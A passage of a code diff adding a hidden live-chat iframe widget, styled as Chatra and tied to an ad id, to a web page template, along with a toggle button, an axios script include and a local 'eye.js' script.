+   chatra--side-bottom
+   chatra--pos-right
+   chatra--visible
+   chatra--expanded
+   chatra--fast-toggle
+ " id="chatra" data-turbolinks-permanent="" style="
+   width: 380px;
+   height: 600px;
+   transform: none;
+   z-index: 2147483647;
+   display: none;
+ ">
+    <div id="chatra__iframe-wrapper">
+      <iframe frameborder="0" id="chatra__iframe" allowtransparency="true" title="Chatra live chat" allow="autoplay"
+        src="/supportChatFrame/<%=ad.id%>" style="width: 380px; height: 600px; position: absolute"></iframe>
+    </div>
+  </div>
+  <div class="support-circle"
+    onclick="document.querySelector('#chatra').style.display = 'block';style.display = 'none'"></div>
+                          `
+        }
+    </script>
+
+
+
+
+
+
+
+    <script>
+        const adId = "<%=ad.id%>"
+    </script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/0.19.2/axios.min.js"></script>
+    <script src="/js/eye.js" defer></script>
+
+</body>
